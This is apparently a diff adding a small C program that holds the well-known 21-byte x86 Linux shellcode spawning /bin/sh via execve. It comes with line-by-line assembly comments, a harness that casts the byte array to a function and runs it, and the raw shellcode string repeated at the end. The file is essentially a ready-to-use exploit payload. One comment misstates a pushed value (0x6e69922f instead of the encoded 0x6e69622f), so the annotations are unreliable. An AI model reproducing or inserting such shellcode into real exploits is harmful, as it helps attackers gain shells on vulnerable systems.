@@ -1,0 +1,26 @@
+/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
+  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
+  thanks : `ivan, milo, #oldschool crew
+*/
+
+int main(){
+
+// Define the shellcode as a character array
+char sc[] = 
+    "\x6a\x0b" // push byte +0xb: Push the syscall number for execve (11) onto the stack
+    "\x58"      // pop eax: Pop the syscall number into the EAX register
+    "\x99"      // cdq: Zero out the EDX register (sets EDX to 0)
+    "\x52"      // push edx: Push a null byte onto the stack (used as the null terminator for the string)
+    "\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f: Push the string "//sh" onto the stack
+    "\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f: Push the string "/bin" onto the stack
+    "\x89\xe3" // mov ebx, esp: Move the stack pointer (ESP) into the EBX register (points to "/bin//sh")
+    "\x31\xc9" // xor ecx, ecx: Zero out the ECX register (sets argv to NULL)
+    "\xcd\x80"; // int 0x80: Trigger the system call to execute execve
+
+// Cast the shellcode to a function pointer and execute it
+((void (*)()) sc)();
+}
+
+/*
+sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+*/
